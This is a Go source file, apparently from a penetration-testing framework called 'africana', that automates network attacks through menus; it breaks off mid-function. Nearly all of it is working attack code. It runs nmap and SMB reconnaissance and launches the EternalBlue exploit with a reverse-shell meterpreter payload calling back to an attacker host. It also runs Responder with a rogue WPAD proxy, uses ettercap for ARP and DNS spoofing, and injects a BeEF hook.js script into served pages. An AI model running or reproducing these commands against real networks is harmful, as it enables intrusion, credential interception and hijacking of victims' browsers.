package internals

import (
    "os"
    "fmt"
    "utils"
    "menus"
    "bufio"
    "strings"
    "os/exec"
    "bcolors"
    "subprocess"
)

var (
    userInput   string
    userTarget  string
    userLhost   string
    userLPort   string
    userFakeDns string
    userName    string
    userPass    string
    userIface   string
    reader = bufio.NewReader(os.Stdin)
)

func InternalScan() {
    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; active; ticker on"`); fmt.Println()
}

func NmapPortScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing: " + bcolors.RED + bcolors.ITALIC + "PORT scan " + bcolors.DARKGREEN + "Target " + bcolors.PURPLE + "set to: " + bcolors.ORANGE + bcolors.ITALIC + "%s 🐾" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC, userTarget)
    //subprocess.Popen(`masscan -v %s --ports 0-65535 --rate 10000 --wait 0`, userTarget); fmt.Println()
    subprocess.Popen(`nmap --open -T4 -Pn -n -v -p- %s`, userTarget); fmt.Println()
}

func NmapVulnScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing vuln scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap --open -T4 -Pn -n -sSV -p- --script="vuln and safe" --reason %s`, userTarget); fmt.Println()
}

func SmbVulnScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB scan:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`nmap -Pn -v --script "smb-vuln*" -p139,445 %s`, userTarget); fmt.Println()
}

func SmbMapScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing SMB recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`smbmap -q -H %s -u null -p null -r --depth 5`, userTarget); fmt.Println()
}

func RpcEnumScan(userTarget string) {
    fmt.Println(); fmt.Printf(bcolors.BLUE + "[" + bcolors.ENDC + bcolors.BOLD + "*" + bcolors.ENDC + bcolors.BLUE + "] " + bcolors.ENDC + bcolors.BLUE + "Performing RPC Recon:" + bcolors.ORANGE + "(◣_◢) " +  bcolors.GREEN + "target!!🎯 " + bcolors.YELLOW + "%s 🐾\n" + bcolors.ENDC, userTarget)
    subprocess.Popen(`rpcclient -U "" -N %s`, userTarget); fmt.Println()
}

func SmbExploit(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        return
    }
    menus.MenuThreeOne()
    for {
        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            fmt.Println()
            subprocess.Popen(`ip address`)
            fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LPORT " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "9999" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLport, _ := reader.ReadString('\n')
            userLport = strings.TrimSpace(userLport)
            if userLport == "" {
                userLport = "9999"
            }
            fmt.Println()
            subprocess.Popen(`msfdb start; msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, userTarget, userLhost, userLport)
            fmt.Println()
        case "cls", "clear":
            utils.ClearScreen()
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeOne()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpMenuThree()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 & 1 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    }
    fmt.Println()
}

func PacketSniffer(userTarget string) {
    menus.MenuThreeTwo()
    for {
        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Sniffer" + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐽" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        fmt.Scan(&userInput)
        switch userInput {
        case "0":
            return
        case "1":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, userTarget); fmt.Println()
        case "2":
            subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`); fmt.Println()
        case "99", "m", "M", "menu", "Menu", "MENU":
            menus.MenuThreeTwo()
        case "00", "h", "H", "help", "Help", "HELP":
            menus.HelpMenuThree()
        default:
            fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
        }
    }
    fmt.Println()
}

func PacketsResponder() {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    filePath := "/etc/responder/Responder.conf.bak_africana"
    if _, err := os.Stat(filePath); os.IsNotExist(err) {
        subprocess.Popen(`cp /etc/responder/Responder.conf /etc/responder/Responder.conf.bak_africana`)
        fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userIface, _ := reader.ReadString('\n')
        userIface = strings.TrimSpace(userIface)
        if userIface == "" {
            userIface = "eth0"
        }
        fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Responder " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
        fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
        userLhost, _ := reader.ReadString('\n')
        userLhost = strings.TrimSpace(userLhost)
        if userLhost == "" {
            userLhost = userLhostIp
        }
        newString  := fmt.Sprintf(`WPADScript = function FindProxyForURL(url, host)[if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "ProxySrv")||shExpMatch(host, "(*.ProxySrv|ProxySrv)")) return "DIRECT"; return 'PROXY %s:3128; PROXY %s:3141; DIRECT';]'`, userLhost, userLhost)
        filesToReplacements := map[string]map[string]string{
            "/etc/responder/Responder.conf": {
            `WPADScript =`: newString,
            },
        }
        utils.Editors(filesToReplacements)
        subprocess.Popen(`responder -I %s -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`, userIface); fmt.Println()
    } else {
        subprocess.Popen(`responder -I %s -Pdv; rm -rf /etc/responder/Responder.conf; mv /etc/responder/Responder.conf.bak_africana /etc/responder/Responder.conf`, userIface); fmt.Println()
    }
}

func BeefEttercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeFour()
    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userIface, _ := reader.ReadString('\n')
            userIface = strings.TrimSpace(userIface)
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userFakeDns, _ := reader.ReadString('\n')
            userFakeDns = strings.TrimSpace(userFakeDns)
            if userFakeDns == "" {
                userFakeDns = "*"
            }
            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            userGateway, err := utils.GetDefaultGatewayIP()
            if err != nil {
                panic(err)
            }
            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof  /%s// /%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns; systemctl --no-pager status apache2.service beef-xss.service`)
    case "2":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userIface, _ := reader.ReadString('\n')
            userIface = strings.TrimSpace(userIface)
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefEttercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "FAKEDNS " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Lengendery * A 0.0.0.0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userFakeDns, _ := reader.ReadString('\n')
            userFakeDns = strings.TrimSpace(userFakeDns)
            if userFakeDns == "" {
                userFakeDns = "*"
            }
            filePathO := "/etc/ettercap/etter.conf.bak_africana"
            if _, err := os.Stat(filePathO); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.conf /etc/ettercap/etter.conf.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.conf": {
                        `ec_uid = 65534`: `ec_uid = 0`,
                        `ec_gid = 65534`: `ec_gid = 0`,
                        `#redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir_command_off = "iptables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_on = "ip6tables -t nat -A PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                        `#redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`: `redir6_command_off = "ip6tables -t nat -D PREROUTING -i %iface -p tcp -d %destination --dport %port -j REDIRECT --to-port %rport"`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            filePathT := "/etc/ettercap/etter.dns.bak_africana"
            if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s", userFakeDns, " A ", userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/etc/ettercap/etter.dns": {
                        `# vim:ts=8:noexpandtab`: newString,
                     },
                }
            utils.Editors(filesToReplacements)
            }
            fileXPath := "/var/www/html/.userFiles"
            if _, err := os.Stat(fileXPath); os.IsNotExist(err) {
                subprocess.Popen(`mkdir -p /var/www/html/.userFiles/; mv /var/www/html/* /var/www/html/.userFiles/; cp -r /root/.africana/africana-base/africana-site/* /var/www/html/`)
                newString  := fmt.Sprintf(`<script src="http://%s:3000/hook.js"></script>`, userLhost)
                filesToReplacements := map[string]map[string]string{
                    "/var/www/html/index.html": {
                        `africana-beef`: newString,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl restart apache2.service beef-xss.service; systemctl --no-pager status apache2.service beef-xss.service; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -TQi %s -M arp:remote -P dns_spoof ///`, userLhostIp, userIface); fmt.Println()
            subprocess.Popen(`systemctl stop apache2.service beef-xss.service; rm -rf /var/www/html/index.html; rm -rf /var/www/html/index_files; mv /var/www/html/.userFiles/* /var/www/html/; rm -rf /var/www/html/.userFiles/; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns; systemctl --no-pager status apache2.service beef-xss.service`)
    default:
        fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
    }
    fmt.Println()
}

func BeefBettercap(userTarget string) {
    userLhostIp, err := utils.GetDefaultIP()
    if err != nil {
        fmt.Println("Error getting default userLhostIp:", err)
        os.Exit(1)
    }
    menus.MenuThreeFour()
    fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap" + bcolors.BLUE + ")\n" + bcolors.ENDC)
    fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
    fmt.Scan(&userInput)
    switch userInput {
    case "0":
        return
    case "1":
        filePath := "/etc/beef-xss/config.yaml.bak_africana"
        if _, err := os.Stat(filePath); os.IsNotExist(err) {
            subprocess.Popen(`cp -rf /etc/beef-xss/config.yaml /etc/beef-xss/config.yaml.bak_africana`)
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Type new " + bcolors.ENDC + "password " + bcolors.DARKGREY + bcolors.ITALIC + "for the " + bcolors.ENDC + "beef " + bcolors.DARKGREY + bcolors.ITALIC + "user" + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            fmt.Scan(&userPass)
            newString := fmt.Sprintf(`passwd: "%s"`, userPass)
            filesToReplacements := map[string]map[string]string{
                "/etc/beef-xss/config.yaml": {
                `passwd: "beef"`: newString,
                },
            }
            utils.Editors(filesToReplacements)
            subprocess.Popen(`chown -R beef-xss:beef-xss /usr/share/beef-xss/./config.yaml`)

            filePath := "/usr/lib/systemd/system/beef-xss.service.bak_africana"
            if _, err := os.Stat(filePath); os.IsNotExist(err) {
                subprocess.Popen(`cp -rf /usr/lib/systemd/system/beef-xss.service /usr/lib/systemd/system/beef-xss.service.bak_africana`)
                filesToReplacements := map[string]map[string]string{
                    "/usr/lib/systemd/system/beef-xss.service": {
                        `User=beef-xss`: `User=root`,
                    },
                }
            utils.Editors(filesToReplacements)
            }
            fmt.Println(); subprocess.Popen(`systemctl daemon-reload`)
            }
            fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userIface, _ := reader.ReadString('\n')
            userIface = strings.TrimSpace(userIface)
            if userIface == "" {
                userIface = "eth0"
            }
            fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefBettercap " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
            fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
            userLhost, _ := reader.ReadString('\n')
            userLhost = strings.TrimSpace(userLhost)
            if userLhost == "" {
                userLhost = userLhostIp
            }
            //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.africana/certs/africana-cert.pem; set https.proxy.key /root/.africana/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userTarget, userLhost); fmt.Println()
